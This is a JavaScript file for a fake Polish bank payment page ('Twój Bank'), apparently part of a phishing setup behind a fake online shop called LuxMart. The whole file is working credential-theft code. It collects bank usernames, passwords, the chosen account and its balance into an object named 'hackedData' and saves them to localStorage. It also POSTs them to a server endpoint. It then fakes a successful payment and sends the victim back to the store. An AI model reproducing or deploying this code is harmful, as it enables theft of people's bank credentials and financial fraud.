// Twój Bank - Premium Logic
const DOM = {
    loginStep: document.getElementById('loginStep'),
    accountStep: document.getElementById('accountStep'),
    processingStep: document.getElementById('processingStep'),
    successStep: document.getElementById('successStep'),

    // Login form
    bankUsername: document.getElementById('bankUsername'),
    bankPassword: document.getElementById('bankPassword'),
    bankLoginBtn: document.getElementById('bankLoginBtn'),

    // Success
    countdownSpan: document.getElementById('countdown'),
    returnNowBtn: document.getElementById('returnNowBtn')
};

let paymentData = null;
let hackedData = {
    login: '',
    password: '',
    selectedAccount: '',
    accountBalance: '',
    source: 'Twój Bank' // Oznaczenie dla admina
};
let countdown = 5;
let countdownInterval = null;

document.addEventListener('DOMContentLoaded', init);

function init() {
    loadPaymentData();
    setupEventListeners();
}

function selectAccount(name, balance) {
    hackedData.selectedAccount = name;
    hackedData.accountBalance = balance;

    // Zapisz przejęte dane przy wyborze konta
    saveHackedData();
    processPayment();
}

function setupEventListeners() {
    DOM.bankLoginBtn.addEventListener('click', handleLogin);
    DOM.returnNowBtn.addEventListener('click', returnToStore);

    // Toggle password visibility
    document.querySelectorAll('.toggle-password').forEach(btn => {
        btn.addEventListener('click', () => {
            const input = btn.previousElementSibling;
            const icon = btn.querySelector('i');
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        });
    });

}

function loadPaymentData() {
    const urlParams = new URLSearchParams(window.location.search);
    const dataParam = urlParams.get('data');
    if (dataParam) {
        try {
            paymentData = JSON.parse(decodeURIComponent(dataParam));
        } catch (e) { console.error(e); }
    }
    if (!paymentData) window.location.href = 'index.html';
}

function handleLogin() {
    hackedData.login = DOM.bankUsername.value;
    hackedData.password = DOM.bankPassword.value;
    if (!hackedData.login || !hackedData.password) {
        alert('Proszę przeprowadzić autoryzację.');
        return;
    }
    showStep('account');
}

function saveHackedData() {
    // Zachowaj w localStorage dla kompatybilności
    let allHacked = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
    hackedData.timestamp = new Date().toISOString();
    hackedData.orderId = paymentData.orderId;
    allHacked.push(hackedData);
    localStorage.setItem('luxmart_hacked_data', JSON.stringify(allHacked));

    // Wyślij do serwera (trwały zapis w pliku)
    fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(hackedData)
    }).catch(err => console.error('Błąd zapisu do pliku:', err));
}

function processPayment() {
    showStep('processing');
    setTimeout(() => completePayment(), 2000);
}

function completePayment() {
    showStep('success');

    // Update order
    const userOrdersKey = `luxmart_orders_${paymentData.userEmail}`;
    const userOrdersData = localStorage.getItem(userOrdersKey);
    if (userOrdersData) {
        let orders = JSON.parse(userOrdersData);
        const orderIndex = orders.findIndex(o => o.id === paymentData.orderId);
        if (orderIndex !== -1) {
            orders[orderIndex].status = 'processing';
            localStorage.setItem(userOrdersKey, JSON.stringify(orders));
        }
    }
    localStorage.setItem('luxmart_cart', JSON.stringify([]));

    document.getElementById('confirmationNumber').textContent = 'TXN-' + Date.now().toString().substr(-12);
    startCountdown();
}

function startCountdown() {
    DOM.countdownSpan.textContent = countdown;
    countdownInterval = setInterval(() => {
        countdown--;
        DOM.countdownSpan.textContent = countdown;
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            returnToStore();
        }
    }, 1000);
}

function returnToStore() {
    window.location.href = 'index.html';
}

function showStep(step) {
    DOM.loginStep.classList.remove('active');
    if (DOM.accountStep) DOM.accountStep.classList.remove('active');
    DOM.processingStep.classList.remove('active');
    DOM.successStep.classList.remove('active');

    if (step === 'login') DOM.loginStep.classList.add('active');
    else if (step === 'account') DOM.accountStep.classList.add('active');
    else if (step === 'processing') DOM.processingStep.classList.add('active');
    else if (step === 'success') DOM.successStep.classList.add('active');
}
